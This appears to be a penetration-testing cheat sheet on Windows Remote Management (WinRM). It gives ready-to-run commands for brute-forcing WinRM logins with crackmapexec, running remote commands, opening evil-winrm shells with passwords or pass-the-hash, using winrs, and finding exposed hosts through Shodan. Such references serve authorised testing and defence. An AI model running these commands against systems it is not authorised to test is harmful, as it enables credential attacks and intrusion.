# WinRM

[Windows Remote Management](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) (WinRM) is a Microsoft protocol that **allows remote management of Windows machines** over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)

The easiest way to detect whether WinRM is available is by seeing if the port is opened. WinRM will listen on one of two ports:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

If one of these ports is open, WinRM is configured and you can try entering a remote session.

### Brute Force

Be careful, brute-forcing WinRM could block users.

```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
## Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
## Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```

### Using evil-winrm

```ruby
gem install evil-winrm
```

Read **documentation** on its github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```

To use evil-winrm to connect to an **IPv6 address** create an entry inside _**/etc/hosts**_ setting a **domain name** to the IPv6 address and connect to that domain.

### Pass the hash with evil-winrm

```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```

### Winrs

```
winrs -r:192.168.1.105 -u:ignite.local\administrator -p:Ignite@987 ipconfig
```

### Shodan

* `port:5985 Microsoft-HTTPAPI`
